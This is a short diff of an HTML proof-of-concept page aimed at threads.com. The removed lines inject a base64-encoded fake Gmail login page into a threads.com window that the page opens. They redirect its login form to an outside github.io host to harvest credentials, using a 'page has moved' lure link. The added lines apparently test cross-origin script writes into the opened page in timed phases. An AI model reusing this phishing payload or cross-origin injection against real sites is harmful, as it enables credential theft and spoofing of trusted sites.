@@ -1,17 +1,39 @@
+
+<!DOCTYPE html>
+<html>
 <body>
 <script>
-var gmail = '';
+(function A() {
 
-window.onclick = function(){
-  var x = window.open('https://www.threads.com/csi')
-  setTimeout(function(){
-    x.document.body.innerHTML = atob(gmail);
-    var form = x.document.querySelector('form#gaia_loginform');
-    form.setAttribute('action', 'https://xnxrx.github.io/xnurx/threads.html')
-  }, 700);
-}
+  var w = open("https://www.threads.com", "ABSURD_LAB");
 
+  (function B() {
+
+    setTimeout(function C() {
+
+      if (!w || w.closed) return;
+
+      w.document.write("<h1>Phase One</h1>");
+
+      setTimeout(function D() {
+
+        if (!w.closed) {
+          w.document.body.innerHTML +=
+            "<h2>Phase Two</h2>";
+        }
+
+        setTimeout(function E() {
+          if (!w.closed)
+            w.document.title = "Final Phase";
+        }, 900);
+
+      }, 1300);
+
+    }, 700);
+
+  })();
+
+})();
 </script>
-
-This page has moved. <a href='#'>Click here to be redirected</a>
 </body>
+</html>
